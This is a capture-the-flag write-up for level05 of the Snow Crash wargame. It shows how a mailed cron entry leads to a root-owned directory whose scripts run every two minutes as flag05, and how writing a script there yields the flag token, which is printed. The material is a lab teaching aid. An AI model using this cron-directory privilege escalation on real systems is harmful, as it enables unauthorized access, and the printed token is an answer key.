# level05 - Our Daily Mail

## Daily Mail

- On login we received the followind message: `You have new mail`.
- The mail file path is indicated in the `MAIL` env variable.

```
snow_crash git:(snow_crash) ✗ ssh -p6666 level05@127.0.0.1
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          10.0.2.15
level05@127.0.0.1's password:
You have new mail.
level05@SnowCrash:~$ cat /var/spool/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

## Cron job

- the mail content looks like a cron job line.
- That line executes every two minutes the following command: `su -c "sh /usr/sbin/openarenaserver"` as `flag05`.

## Openarenaserver

- The `/usr/sbin/openarenaserver` exists and belongs to `flag05`.
- It is a shell script.
- It executes all files located in `/opt/openarenaserver/` and then remove them.
- As `level05` user, we only have read rights on the script but we can write in `/opt/openarenaserver/` directory.

```
level05@SnowCrash:~$ ls -al /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
level05@SnowCrash:~$ getfacl -a /usr/sbin/openarenaserver
getfacl: Removing leading '/' from absolute path names
# file: usr/sbin/openarenaserver
# owner: flag05
# group: flag05
user::rwx
user:level05:r--
group::r-x
mask::r-x
other::---
level05@SnowCrash:~$ file /usr/sbin/openarenaserver
/usr/sbin/openarenaserver: POSIX shell script, ASCII text executable
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:~$ ls -al /opt/openarenaserver/
total 0
drwxrwxr-x+ 2 root root 40 Oct 30 10:39 .
drwxr-xr-x  1 root root 60 Oct 30 10:39 ..
level05@SnowCrash:~$ getfacl /opt/openarenaserver/
getfacl: Removing leading '/' from absolute path names
# file: opt/openarenaserver/
# owner: root
# group: root
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
```

## Minute Mail

````
echo "exec /bin/getflag > /tmp/flag" > /opt/openarenaserver/minutemail.sh
level05@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc```
````

# Flag

- `level06` password (flag): `viuaaale9huek52boumoomioc`
